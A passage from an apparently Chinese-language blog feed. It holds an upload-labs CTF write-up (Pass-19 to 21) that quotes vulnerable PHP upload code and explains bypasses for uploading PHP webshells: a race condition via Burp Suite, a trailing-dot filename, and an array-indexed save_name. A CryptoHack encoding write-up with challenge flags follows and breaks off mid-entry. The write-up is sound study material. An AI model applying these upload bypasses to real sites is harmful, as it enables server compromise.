class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_file_exists</span> = <span class="hljs-number">0</span>;         <span class="hljs-comment">// Set to 1 to check if file exist before upload.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_rename_file</span> = <span class="hljs-number">1</span>;         <span class="hljs-comment">// Set to 1 to rename file after upload.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_file_rename_to</span> = <span class="hljs-string">&#x27;&#x27;</span>;     <span class="hljs-comment">// New name for the file after upload.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_verbal</span> = <span class="hljs-number">0</span>;              <span class="hljs-comment">// Set to 1 to return an a string instead of an error code.</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MyUpload</span>(<span class="hljs-params"> <span class="hljs-variable">$file_name</span>, <span class="hljs-variable">$tmp_file_name</span>, <span class="hljs-variable">$file_size</span>, <span class="hljs-variable">$file_rename_to</span> = <span class="hljs-string">&#x27;&#x27;</span> </span>)</span>&#123;<br>  <br>    <span class="hljs-variable language_">$this</span>-&gt;cls_filename = <span class="hljs-variable">$file_name</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_tmp_filename = <span class="hljs-variable">$tmp_file_name</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_filesize = <span class="hljs-variable">$file_size</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to = <span class="hljs-variable">$file_rename_to</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isUploadedFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">is_uploaded_file</span>( <span class="hljs-variable">$this</span>-&gt;cls_tmp_filename ) != <span class="hljs-literal">true</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;IS_UPLOADED_FILE_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setDir</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">is_writable</span>( <span class="hljs-variable">$dir</span> ) )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECTORY_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>      <span class="hljs-variable language_">$this</span>-&gt;cls_upload_dir = <span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkExtension</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-comment">// Check if the extension is valid</span><br><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">in_array</span>( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-title function_ invoke__">strrchr</span>( <span class="hljs-variable">$this</span>-&gt;cls_filename, <span class="hljs-string">&quot;.&quot;</span> )), <span class="hljs-variable">$this</span>-&gt;cls_arr_ext_accepted ))&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;EXTENSION_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSize</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_filesize &gt; <span class="hljs-variable language_">$this</span>-&gt;cls_max_filesize )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FILE_SIZE_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$this</span>-&gt;cls_tmp_filename, <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_filename ) == <span class="hljs-literal">false</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;MOVE_UPLOADED_FILE_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFileExists</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_filename ) )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FILE_EXISTS_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">renameFile</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    <span class="hljs-comment">// if no new name was provided, we use</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to == <span class="hljs-string">&#x27;&#x27;</span> )&#123;<br><br>      <span class="hljs-variable">$allchar</span> = <span class="hljs-string">&quot;abcdefghijklnmopqrstuvwxyz&quot;</span> ; <br>      <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to = <span class="hljs-string">&quot;&quot;</span> ; <br>      <span class="hljs-title function_ invoke__">mt_srand</span> (( <span class="hljs-keyword">double</span>) <span class="hljs-title function_ invoke__">microtime</span>() * <span class="hljs-number">1000000</span> ); <br>      <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">8</span> ; <span class="hljs-variable">$i</span>++ )&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to .= <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$allchar</span>, <span class="hljs-title function_ invoke__">mt_rand</span> (<span class="hljs-number">0</span>,<span class="hljs-number">25</span>), <span class="hljs-number">1</span> ) ; <br>      &#125;<br>    &#125;    <br>    <br>    <span class="hljs-comment">// Remove the extension and put it back on the new file name</span><br><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strrchr</span>( <span class="hljs-variable">$this</span>-&gt;cls_filename, <span class="hljs-string">&quot;.&quot;</span> );<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to .= <span class="hljs-variable">$extension</span>;<br>    <br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_filename, <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_file_rename_to ))&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RENAME_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resultUpload</span>(<span class="hljs-params"> <span class="hljs-variable">$flag</span> </span>)</span>&#123;<br><br>    <span class="hljs-keyword">switch</span>( <span class="hljs-variable">$flag</span> )&#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;IS_UPLOADED_FILE_FAILURE&quot;</span> : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded to the tmp directory of the web server.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;DIRECTORY_FAILURE&quot;</span>        : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, the directory is not writable.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;EXTENSION_FAILURE&quot;</span>        : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">3</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, this type of file is not accepted.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;FILE_SIZE_FAILURE&quot;</span>        : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">4</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, this file is too big.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;FILE_EXISTS_FAILURE&quot;</span>      : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">5</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, a file with the same name already exists.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;MOVE_UPLOADED_FILE_FAILURE&quot;</span> : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">6</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, the file could not be copied to destination directory.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;RENAME_FAILURE&quot;</span>           : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file was uploaded but could not be renamed.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;SUCCESS&quot;</span>                  : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Upload was successful!&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span> : <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OUPS!! We do not know what happen, you should fire the programmer ;)&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>&#125;; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先检查拓展，再上传，然后移动文件再改名</p><p><img src="/2025/07/19/upload-labs/pass_19_1.png"></p><p>利用Apache的陌生后缀解析绕过，上传test.php.7z</p><p>bp抓包，添加一个无关紧要的参数控制爆破次数</p><p><img src="/2025/07/19/upload-labs/pass_19_2.png"></p><p>成功解析</p><p><img src="/2025/07/19/upload-labs/pass_19_3.png"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>保存名称改为“upload-19.php.”</p><p>上传test.php</p><p>尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_20_1.png"></p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//检查MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查文件名</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先检查MIME类型是否为图像</p><p>然后检查post表单中是否有save_name，没有就将上传的文件名赋给$file，否则就将save_name赋给$file</p><p>再检查$file是不是一个数组，如果不是就用explode()以“.”作为分割符将转为小写后的$file分割为一个数组</p><p>接下来将数组的最后一个元素赋给$ext作为拓展名，然后检查$ext是否在白名单中，不在则禁止上传</p><p>将$file数组的第一个值作为文件名和最后一个值作为文件拓展名赋给$file_name，并将文件上传到UPLOAD_PATH&#x2F;$filename</p><p>关键在于如何构造$file数组</p><p>上传test.jpg，bp抓包，将save_name改为有两个值的数组，但是下标设为0和2，这样在为$file_name赋值时，$file[count($file)-1]为$file[1]为空，那么$file_name的值为$file[0]加上“.”，由于windows特性，文件名实际就是$file[0]</p><p><img src="/2025/07/19/upload-labs/pass_21_1.png"></p><p>尝试命令执行</p><p><img src="/2025/07/19/upload-labs/pass_21_2.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>file_uploads</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cryptohack</title>
    <link href="/2025/07/12/cryptohack/"/>
    <url>/2025/07/12/cryptohack/</url>
    
    <content type="html"><![CDATA[<h2 id="general"><a href="#general" class="headerlink" title="general"></a>general</h2><h3 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><blockquote><p>ASCII 是一种 7 位编码标准，允许使用整数 0-127 表示文本。</p><p>在 Python 中，该 <code>chr()</code> 函数可用于将 ASCII 序数转换为字符（该 <code>ord()</code> 函数的作用相反）。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">arr = [<span class="hljs-number">99</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">112</span>, <span class="hljs-number">116</span>, <span class="hljs-number">111</span>, <span class="hljs-number">123</span>, <span class="hljs-number">65</span>, <span class="hljs-number">83</span>, <span class="hljs-number">67</span>, <span class="hljs-number">73</span>, <span class="hljs-number">73</span>, <span class="hljs-number">95</span>, <span class="hljs-number">112</span>, <span class="hljs-number">114</span>, <span class="hljs-number">49</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">52</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">51</span>, <span class="hljs-number">125</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> arr:<br>    flag += <span class="hljs-built_in">chr</span>(c)<br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#  crypto&#123;ASCII_pr1nt4bl3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h4><blockquote><p>当我们加密某些内容时，生成的密文通常包含不可打印的 ASCII 字符的字节。如果我们想共享我们的加密数据，通常会将其编码为更用户友好且在不同系统之间可移植的数据。十六进制可以以这种方式用于表示 ASCII 字符串。</p><p>在 Python 中，该 <code>bytes.fromhex()</code> 函数可用于将十六进制转换为字节。可以在字节字符串上调用 <code>.hex()</code> instance 方法以获取十六进制表示形式。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d&quot;</span>))<br><br><span class="hljs-comment">#  b&#x27;crypto&#123;You_will_be_working_with_hex_strings_a_lot&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><blockquote><p>另一种常见的编码方案是 Base64，它允许我们使用 64 个字符的字母将二进制数据表示为 ASCII 字符串。Base64 字符串的一个字符编码 6 个二进制数字 （bit），因此 Base64 的 4 个字符编码 3 个 8 位字节。</p><p>Base64 是在线最常用的，因此图像等二进制数据可以轻松包含在 HTML 或 CSS 文件中。</p><p>在 Python 中，使用 <code>import base64</code> 导入 base64 模块后，可以使用该 <code>base64.b64encode()</code> 函数。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>flag = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf&quot;</span>)<br><br><span class="hljs-built_in">print</span>(base64.b64encode(flag))<br><br><span class="hljs-comment">#  b&#x27;crypto/Base+64+Encoding+is+Web+Safe/&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Bytes-and-Integers"><a href="#Bytes-and-Integers" class="headerlink" title="Bytes and Integers"></a>Bytes and Integers</h4><blockquote><p>像 RSA 这样的加密系统可以处理数字，但消息是由字符组成的。我们应该如何将我们的消息转换为数字，以便可以应用数学运算？</p><p>最常见的方法是获取消息的序号字节，将它们转换为十六进制，然后连接起来。这可以解释为 base-16&#x2F;十六进制数，也可以用 base-10&#x2F;decimal 表示。</p><p>Python 的 PyCryptodome 库使用方法 <code>bytes_to_long()</code> 和 <code>long_to_bytes()</code> 来实现这一点。首先必须安装 PyCryptodome 并使用 <code>from Crypto.Util.number import *</code></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>s = <span class="hljs-number">11515195063862318899931685488813747395775516287289682636499965282714637259206269</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(s))<br><br><span class="hljs-comment">#  